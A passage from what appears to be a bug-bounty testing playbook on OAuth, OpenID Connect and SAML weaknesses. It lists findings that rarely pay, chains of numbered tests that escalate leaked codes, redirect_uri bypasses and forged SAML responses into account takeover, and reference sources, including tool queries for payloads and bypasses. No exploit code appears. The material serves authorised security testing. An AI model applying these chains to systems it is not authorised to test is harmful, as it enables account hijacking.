  same chain, stronger proof. Each first-party "Sign in with <programme>" client and each internal tool that admits
  by e-mail domain (#565883) is an OAU-007 target. A relying party that also skips its second factor for SSO:
  AUT-006.

## Graveyard

- **Login CSRF on its own** (`csrf-low`). OAU-004 without a chain: most policies list it, and where it was paid
  it was low (#1878381, $500). Park it with the chain partner in the note.
- **"The `state` parameter is missing"** with no victim browser shown, or as scanner output (`automated`). Many
  clients bind the response through PKCE or a nonce kept in the session instead; only the replay in OAU-004
  decides.
- **Account-linking CSRF filed from this chapter.** Connect and link callbacks are CSR-009's test, and a sign-in
  callback that also links is one root cause with OAU-004: one report, filed as CSRF.
- **An open redirect at the authorization endpoint** (`open-redirect`). The provider sends an error, or the user
  after sign-in, to an unregistered `redirect_uri` with no code or token in it (#55525, #206811, #972601,
  #3099816). It pays only as the forwarder of OAU-002.
- **Clickjacking or double-clickjacking the consent page** (`clickjacking`). Usually excluded or informative
  (#65825); one programme rated a double-click approval medium (#3287060). Read the policy before spending time.
- **PKCE absent, `plain` accepted, no `nonce`, the implicit flow still enabled.** Hardening that RFC 9700
  recommends; closed informative without a leak that the missing check would have stopped (OAU-006, OAU-003).
- **Lifetimes and revocation** (`session-expiry`). Codes valid for hours (#1784162, $100), long-lived ID tokens
  (#1593413, $250), tokens that survive logout or the revocation of an app: low, unless a removed member or a
  revoked app keeps acting (AUT-017).
- **The secret of a public client.** Mobile, desktop and single-page clients cannot keep a secret; providers treat
  them as public, and Google documents the secret of installed apps as not confidential. Only a confidential
  client's live secret is OAU-008.
- **Open dynamic client registration.** RFC 7591 allows it, and a client named like the programme's own app is
  consent phishing (`social-engineering`). It counts only through what the provider fetches (OAU-011) or what it
  lets registered clients skip (OAU-012).
- **Bugs inside a third-party identity provider** (`third-party`). Google, Apple, Microsoft, Okta or Auth0
  mis-validating someone else's client, or asserting an address for anyone, belongs to their own programmes. The
  programme's own registration, redirect space and e-mail matching are the programme's.
- **XXE in the SAMLResponse.** The parser flaw is XXE-009, gated on `saml`: run it and file it there once. A
  DOCTYPE refused by the SP's parser is a negative for both chapters.
- **SAML replay with no way to obtain the victim's response** (#888930 was rated low). Report it with a capture
  path (a response in a URL, a log, a shared proxy) or not at all.
- **Rate limits on the token endpoint or the identity provider's sign-in** (`rate-limit`). Codes and client
  secrets are long and random; a missing limit is rarely paid (#1258448, $500).
- **Interception of a native app's redirect.** Custom-scheme and intent hijacking of a mobile client's code
  (#1700734, #5314) needs an app on the victim's device: the mobile chapter's, out of scope for a web asset.
- **Denial of service of the sign-in** (`dos`). A one-click break of a client (#702987) or a token invalidation
  that locks a product (#210779) is outside most policies.
- **XSS and CRLF in OAuth parameters.** A reflected `state`, `error_description` or `redirect_uri` is the XSS or
  CRLF chapter's item on an OAuth page (#697099, #2515808, #2147132): report it there, with account takeover as the
  impact when the origin holds the session.
- **Duplicates.** `redirect_uri` bypasses on the first-party clients of long-running public programmes are
  reported often. A bypass of a fixed report is new work; the same broad registration is not.

## Chains

- OAU-001, OAU-002 and RDR-008 → OAU-006 and OAU-008: a code that leaks becomes a session through the client's
  callback, or through our own redemption when the client is public, its secret ships, or the provider does not
  bind codes to clients.
- OAU-002 → OAU-003: `response_type=token` turns a query-dropping forwarder into a token leak, because the browser
  keeps the fragment across a 30x.
- OAU-003 and OAU-012 → OAU-010: the scopes of the token we obtained decide the severity; API-015 for routes that
  ignore them.
- STO → OAU-001 and OAU-002: a wildcard or a sub-domain inside the redirect space that can be claimed (#172137).
  XSS on a page inside that space reads the code or the fragment (#316948).
- XSS-004 → OAU-001 and OAU-011: a `javascript:` redirect URI or client URL rendered as a link on the provider's
  pages runs on the provider's origin (#392106, #397497).
- OAU-004 → CSR-009: the same capture against a signed-in victim attaches our identity. CSR-010's escalations
  (a self-XSS, data saved into our account) apply to the session switch.
- AUT-014 → OAU-015 → OAU-007: an address made verified without proof, asserted by the provider, matched by a
  relying party.
- OAU-005, OAU-007, OAU-013 and OAU-014 → AUT-006: an SSO sign-in that skips the account's second factor
  (#1593404).
- OAU-005 → OAU-013 and OAU-014: a forged or wrapped identity sent to another tenant's ACS; BAC-011 when the SSO
  settings accept a member without the admin role.
- XXE-009 and XXE-010 → OAU-013 and OAU-014: the same SAML endpoint parses our XML before it checks the
  signature.
- JWT-003, JWT-006 and JWT-007 → OAU-009: key confusion, an embedded key and a key URL, aimed at the sign-in
  endpoint's check of the provider's token.
- CLD-007 → OAU-007: a Cognito user who can change `email` is an identity provider asserting an unproven address.
- OAU-011 → SSR-002 to SSR-005 and the XXE chapter: the field that fetched is the fetcher; a logo the server
  parses as SVG or XML is an XML parser (#104620).
- RDR-007: first-party SSO hand-offs that append a token to a return URL. INF-011: codes and tokens in URLs that
  reach analytics or other third parties.
- CRL: a CRLF in `redirect_uri` that reaches the provider's `Location` (#2147132).

## Sources

- `kb/reports/oauth.md` and `kb/reports/all/oauth.md`: the disclosed reports this chapter is built from;
  `kb/data/index.jsonl` for the ones filed under other classes (#86504, #565883, #1711938, #419655, #824931).
- HexBrain: `get_testing_playbook {"topic":"OAuth"}`, `get_testing_playbook {"topic":"SAML"}`,
  `find_bypasses {"protection":"oauth redirect_uri validation"}`, `find_payloads {"topic":"SAML Injection"}`.
- RFC 6749 (§4.1.2 single-use codes, §4.1.3 the `redirect_uri` binding, §6 refresh scope, §10.12 CSRF), RFC 9700
  (OAuth 2.0 Security Best Current Practice), RFC 7636 (PKCE), RFC 8252 (native apps and loopback redirects), RFC
  7591 and RFC 7592 (dynamic client registration and its management), RFC 9101 (request objects), RFC 9207 (the
  `iss` response parameter), RFC 8693 (token exchange).
- OpenID Connect Core 1.0: §3.1.3.7 ID token validation, §5.7 `iss` and `sub` as the only stable identifier, §6.2
  `request_uri`; OpenID Connect Dynamic Client Registration 1.0 (`sector_identifier_uri`).
- SAML 2.0 Profiles §4.1.4 (bearer confirmation, `Recipient`, `InResponseTo`, one-time use); Somorovsky et al.,
  "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012); Duo Labs, "Duo Finds SAML Vulnerabilities
  Affecting Multiple Implementations" (2018), the comment-truncation family.
- PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities and OpenID Connect, including SSRF
  via OpenID dynamic client registration; OWASP WSTG-ATHZ-05 (Testing for OAuth Weaknesses); OWASP SAML Security
  Cheat Sheet; PayloadsAllTheThings, OAuth Misconfiguration and SAML Injection.
- Frans Rosén, "Account hijacking using 'dirty dancing' in sign-in OAuth-flows" (Detectify Labs, 2022); Descope,
  "nOAuth: How Microsoft OAuth Misconfiguration Can Lead to Full Account Takeover" (2023).
